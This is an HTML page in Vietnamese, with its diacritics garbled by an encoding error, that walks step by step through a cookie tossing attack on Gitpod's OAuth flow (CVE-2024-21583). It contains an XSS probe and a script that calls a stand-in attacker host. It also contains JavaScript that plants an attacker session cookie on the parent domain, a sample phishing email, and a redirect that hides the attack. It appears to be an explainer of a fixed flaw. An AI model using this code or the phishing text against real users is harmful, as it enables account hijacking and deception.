<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cookie Tossing Attack - Detailed Steps</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            text-align: center;
            color: white;
            margin-bottom: 40px;
        }
        .header h1 {
            font-size: 2.8em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .header p {
            font-size: 1.2em;
            opacity: 0.9;
        }
        .steps-container {
            display: flex;
            flex-direction: column;
            gap: 25px;
        }
        .main-step {
            background: white;
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
        }
        .main-step-header {
            background: #2c3e50;
            color: white;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .step-number {
            background: #e74c3c;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5em;
            font-weight: bold;
        }
        .step-title {
            font-size: 1.4em;
            font-weight: bold;
        }
        .sub-steps {
            padding: 0;
        }
        .sub-step {
            padding: 25px;
            border-bottom: 1px solid #ecf0f1;
            display: flex;
            gap: 20px;
            align-items: flex-start;
        }
        .sub-step:last-child {
            border-bottom: none;
        }
        .sub-step-number {
            background: #3498db;
            color: white;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            flex-shrink: 0;
            margin-top: 5px;
        }
        .sub-step-content {
            flex: 1;
        }
        .sub-step-content h4 {
            color: #2c3e50;
            margin-bottom: 10px;
            font-size: 1.2em;
        }
        .sub-step-content p {
            color: #555;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        .code-block {
            background: #2d3748;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            overflow-x: auto;
            border-left: 4px solid #e74c3c;
        }
        .domain-badge {
            display: inline-block;
            padding: 4px 12px;
            background: #9b59b6;
            color: white;
            border-radius: 15px;
            font-size: 0.8em;
            margin: 0 3px;
            font-family: monospace;
        }
        .malicious {
            background: #e74c3c;
        }
        .victim {
            background: #27ae60;
        }
        .note {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 10px 0;
            border-radius: 0 8px 8px 0;
        }
        .impact {
            background: #f8d7da;
            border-left: 4px solid #dc3545;
            padding: 15px;
            margin: 10px 0;
            border-radius: 0 8px 8px 0;
        }
        .arrow {
            text-align: center;
            color: white;
            font-size: 2em;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üç™ Cookie Tossing Attack</h1>
            <p>Chi ti·∫øt t·ª´ng b∆∞·ªõc t·∫•n c√¥ng v·ªõi v√≠ d·ª• th·ª±c t·∫ø</p>
        </div>

        <div class="steps-container">
            
            <!-- STEP 1 -->
            <div class="main-step">
                <div class="main-step-header">
                    <div class="step-number">1</div>
                    <div class="step-title">Ki·ªÉm so√°t Subdomain</div>
                </div>
                <div class="sub-steps">
                    <div class="sub-step">
                        <div class="sub-step-number">1.1</div>
                        <div class="sub-step-content">
                            <h4>T√¨m Subdomain c√≥ th·ªÉ khai th√°c</h4>
                            <p>K·∫ª t·∫•n c√¥ng t√¨m ki·∫øm c√°c subdomain cho ph√©p user-generated content:</p>
                            <div class="code-block">
// C√°c subdomain ti·ªÅm nƒÉng<br>
<span class="domain-badge">workspace123.gitpod.io</span><br>
<span class="domain-badge">user-content.snyk.io</span><br>
<span class="domain-badge">preview.herokuapp.com</span><br>
<span class="domain-badge">sandbox.netlify.app</span>
                            </div>
                        </div>
                    </div>
                    <div class="sub-step">
                        <div class="sub-step-number">1.2</div>
                        <div class="sub-step-content">
                            <h4>Khai th√°c XSS ho·∫∑c Upload Content</h4>
                            <p>S·ª≠ d·ª•ng l·ªó h·ªïng XSS ho·∫∑c t√≠nh nƒÉng upload file ƒë·ªÉ tri·ªÉn khai m√£ ƒë·ªôc:</p>
                            <div class="code-block">
// Khai th√°c XSS tr√™n subdomain<br>
https://vulnerable-subdomain.example.com/search?q=<br>&lt;script&gt;alert('XSS')&lt;/script&gt;<br><br>
// Upload file HTML ƒë·ªôc h·∫°i<br>
https://user-content.platform.com/malicious-page.html
                            </div>
                        </div>
                    </div>
                    <div class="sub-step">
                        <div class="sub-step-number">1.3</div>
                        <div class="sub-step-content">
                            <h4>X√°c nh·∫≠n Ki·ªÉm so√°t</h4>
                            <p>X√°c minh c√≥ th·ªÉ th·ª±c thi JavaScript tr√™n subdomain:</p>
                            <div class="code-block">
// Test script ƒë·ªÉ x√°c nh·∫≠n control<br>
&lt;script&gt;<br>fetch('https://attacker-server.com/log?control=confirmed')<br>&lt;/script&gt;
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="arrow">‚¨áÔ∏è</div>

            <!-- STEP 2 -->
            <div class="main-step">
                <div class="main-step-header">
                    <div class="step-number">2</div>
                    <div class="step-title">Tri·ªÉn khai Cookie ƒê·ªôc h·∫°i</div>
                </div>
                <div class="sub-steps">
                    <div class="sub-step">
                        <div class="sub-step-number">2.1</div>
                        <div class="sub-step-content">
                            <h4>T·∫°o Session c·ªßa K·∫ª t·∫•n c√¥ng</h4>
                            <p>K·∫ª t·∫•n c√¥ng ƒëƒÉng nh·∫≠p v√† l·∫•y session ID h·ª£p l·ªá t·ª´ t√†i kho·∫£n c·ªßa h·ªç:</p>
                            <div class="code-block">
// Session ID c·ªßa k·∫ª t·∫•n c√¥ng<br>
_gitpod_io_jwt2_ = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."<br><br>
// Ho·∫∑c t·∫°o session gi·∫£ m·∫°o<br>
attacker_session = "attacker_1234567890abcdef"
                            </div>
                        </div>
                    </div>
                    <div class="sub-step">
                        <div class="sub-step-number">2.2</div>
                        <div class="sub-step-content">
                            <h4>Vi·∫øt JavaScript ƒë·ªÉ Set Cookie</h4>
                            <p>T·∫°o script thi·∫øt l·∫≠p cookie tr√™n domain cha v·ªõi c√°c path c·ª• th·ªÉ:</p>
                            <div class="code-block">
// Script ƒë·ªôc h·∫°i tr√™n subdomain<br>
document.cookie = "_gitpod_io_jwt2_=attacker_session;" +<br>
                  "domain=.gitpod.io; " +<br>
                  "path=/api/authorize; " +<br>
                  "expires=" + new Date(Date.now() + 86400000).toUTCString();<br><br>
// Set th√™m cho callback endpoints<br>
document.cookie = "_gitpod_io_jwt2_=attacker_session;" +<br>
                  "domain=.gitpod.io; " +<br>
                  "path=/auth/github/callback";
                            </div>
                        </div>
                    </div>
                    <div class="sub-step">
                        <div class="sub-step-number">2.3</div>
                        <div class="sub-step-content">
                            <h4>Tri·ªÉn khai tr√™n Subdomain</h4>
                            <p>ƒê·∫∑t script ƒë·ªôc h·∫°i l√™n subdomain ƒë√£ ki·ªÉm so√°t:</p>
                            <div class="code-block">
// File: malicious-workspace.html<br>
&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;Legitimate Workspace&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;script&gt;<br>// Cookie tossing code here<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="arrow">‚¨áÔ∏è</div>

            <!-- STEP 3 -->
            <div class="main-step">
                <div class="main-step-header">
                    <div class="step-number">3</div>
                    <div class="step-title">Social Engineering & Phishing</div>
                </div>
                <div class="sub-steps">
                    <div class="sub-step">
                        <div class="sub-step-number">3.1</div>
                        <div class="sub-step-content">
                            <h4>T·∫°o URL ƒê·ªôc h·∫°i</h4>
                            <p>T·∫°o link ƒë·∫øn trang ch·ª©a m√£ ƒë·ªôc ƒë∆∞·ª£c ng·ª•y trang h·ª£p l·ªá:</p>
                            <div class="code-block">
// URL ƒë·ªôc h·∫°i ƒë∆∞·ª£c ng·ª•y trang<br>
https://awesome-project.gitpod.io<br>
https://gitpod.io/#https://github.com/trending-repo/awesome-project<br>
https://preview-team.snyk.io/dashboard
                            </div>
                        </div>
                    </div>
                    <div class="sub-step">
                        <div class="sub-step-number">3.2</div>
                        <div class="sub-step-content">
                            <h4>Chu·∫©n b·ªã N·ªôi dung L·ª´a ƒë·∫£o</h4>
                            <p>T·∫°o n·ªôi dung thuy·∫øt ph·ª•c ƒë·ªÉ l·ª´a n·∫°n nh√¢n nh·∫•p v√†o link:</p>
                            <div class="code-block">
// Email l·ª´a ƒë·∫£o m·∫´u<br>
Ch·ªß ƒë·ªÅ: "C·∫ßn review code kh·∫©n c·∫•p"<br><br>
Hi Team,<br><br>
C√≥ v·∫•n ƒë·ªÅ nghi√™m tr·ªçng trong repo production.<br>
Vui l√≤ng review ngay t·∫°i:<br>
https://emergency-fix.gitpod.io<br><br>
Thanks,<br>
Tech Lead
                            </div>
                        </div>
                    </div>
                    <div class="sub-step">
                        <div class="sub-step-number">3.3</div>
                        <div class="sub-step-content">
                            <h4>Ph√¢n ph·ªëi Link</h4>
                            <p>G·ª≠i link ƒë·ªôc h·∫°i qua c√°c k√™nh kh√°c nhau:</p>
                            <div class="code-block">
- Email n·ªôi b·ªô c√¥ng ty<br>
- Slack/Teams message<br>
- GitHub issues/comments<br>
- Code review requests<br>
- Project management tools
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="arrow">‚¨áÔ∏è</div>

            <!-- STEP 4 -->
            <div class="main-step">
                <div class="main-step-header">
                    <div class="step-number">4</div>
                    <div class="step-title">N·∫°n nh√¢n Truy c·∫≠p & Cookie ƒë∆∞·ª£c Set</div>
                </div>
                <div class="sub-steps">
                    <div class="sub-step">
                        <div class="sub-step-number">4.1</div>
                        <div class="sub-step-content">
                            <h4>N·∫°n nh√¢n Nh·∫•p v√†o Link</h4>
                            <p>N·∫°n nh√¢n (ƒë√£ ƒëƒÉng nh·∫≠p v√†o ·ª©ng d·ª•ng ch√≠nh) truy c·∫≠p URL ƒë·ªôc h·∫°i:</p>
                            <div class="code-block">
// Tr√¨nh duy·ªát truy c·∫≠p subdomain ƒë·ªôc h·∫°i<br>
GET https://malicious-workspace.gitpod.io<br><br>
// T·∫£i v√† th·ª±c thi JavaScript ƒë·ªôc h·∫°i<br>
// Cookie c·ªßa k·∫ª t·∫•n c√¥ng ƒë∆∞·ª£c set tr√™n domain cha
                            </div>
                        </div>
                    </div>
                    <div class="sub-step">
                        <div class="sub-step-number">4.2</div>
                        <div class="sub-step-content">
                            <h4>Cookie ƒë∆∞·ª£c Thi·∫øt l·∫≠p</h4>
                            <p>Tr√¨nh duy·ªát l∆∞u cookie c·ªßa k·∫ª t·∫•n c√¥ng cho domain cha:</p>
                            <div class="code-block">
// Cookies tr√™n tr√¨nh duy·ªát n·∫°n nh√¢n<br>
Name: _gitpod_io_jwt2_<br>
Value: attacker_session_id<br>
Domain: .gitpod.io<br>
Path: /api/authorize<br>
Expires: 1 ng√†y<br><br>
Name: _gitpod_io_jwt2_<br>
Value: attacker_session_id<br>
Domain: .gitpod.io<br>
Path: /auth/github/callback
                            </div>
                        </div>
                    </div>
                    <div class="sub-step">
                        <div class="sub-step-number">4.3</div>
                        <div class="sub-step-content">
                            <h4>Redirect v·ªÅ Trang H·ª£p l·ªá</h4>
                            <p>Sau khi set cookie, redirect n·∫°n nh√¢n v·ªÅ trang h·ª£p l·ªá ƒë·ªÉ tr√°nh nghi ng·ªù:</p>
                            <div class="code-block">
// Redirect sau khi set cookie<br>
window.location.href = "https://gitpod.io/dashboard";<br><br>
// Ho·∫∑c hi·ªÉn th·ªã trang l·ªói gi·∫£ m·∫°o<br>
document.body.innerHTML = "Workspace kh√¥ng kh·∫£ d·ª•ng...";
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="arrow">‚¨áÔ∏è</div>

            <!-- STEP 5 -->
            <div class="main-step">
                <div class="main-step-header">
                    <div class="step-number">5</div>
                    <div class="step-title">K√≠ch ho·∫°t Lu·ªìng OAuth</div>
                </div>
                <div class="sub-steps">
                    <div class="sub-step">
                        <div class="sub-step-number">5.1</div>
                        <div class="sub-step-content">
                            <h4>N·∫°n nh√¢n Th·ª±c hi·ªán H√†nh ƒë·ªông OAuth</h4>
                            <p>N·∫°n nh√¢n th·ª±c hi·ªán h√†nh ƒë·ªông c·∫ßn x√°c th·ª±c OAuth:</p>
                            <div class="code-block">
// C√°c h√†nh ƒë·ªông ph·ªï bi·∫øn<br>
- K·∫øt n·ªëi t√†i kho·∫£n GitHub<br>
- ƒêƒÉng nh·∫≠p qua Google OAuth<br>
- Authorize ·ª©ng d·ª•ng third-party<br>
- Truy c·∫≠p API c·∫ßn x√°c th·ª±c
                            </div>
                        </div>
                    </div>
                    <div class="sub-step">
                        <div class="sub-step-number">5.2</div>
                        <div class="sub-step-content">
                            <h4>Request ƒë·∫øn OAuth Endpoint</h4>
                            <p>Tr√¨nh duy·ªát g·ª≠i request ƒë·∫øn endpoint OAuth v·ªõi cookie c·ªßa k·∫ª t·∫•n c√¥ng:</p>
                            <div class="code-block">
// Request ƒë·∫øn authorize endpoint<br>
GET /api/authorize?<br>response_type=code<br>&client_id=gitpod<br>&redirect_uri=https://gitpod.io/auth/github/callback<br>&state=random_string<br><br>
Cookie: _gitpod_io_jwt2_=attacker_session_id
                            </div>
                        </div>
                    </div>
                    <div class="sub-step">
                        <div class="sub-step-number">5.3</div>
                        <div class="sub-step-content">
                            <h4>Server X·ª≠ l√Ω v·ªõi Session Attacker</h4>
                            <p>Server s·ª≠ d·ª•ng session c·ªßa k·∫ª t·∫•n c√¥ng thay v√¨ session th·∫≠t c·ªßa n·∫°n nh√¢n:</p>
                            <div class="code-block">
// Server x√°c th·ª±c session<br>
Session ID: attacker_session_id ‚Üí T√†i kho·∫£n Attacker<br><br>
// Thay v√¨:<br>
Session ID: victim_session_id ‚Üí T√†i kho·∫£n Victim
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <div style="text-align: center; margin-top: 40px; color: white;">
            <p><strong>CVE-2024-21583</strong> ‚Ä¢ Discovered: 26/06/2024 ‚Ä¢ Fixed: 01/07/2024</p>
        </div>
    </div>
</body>
</html>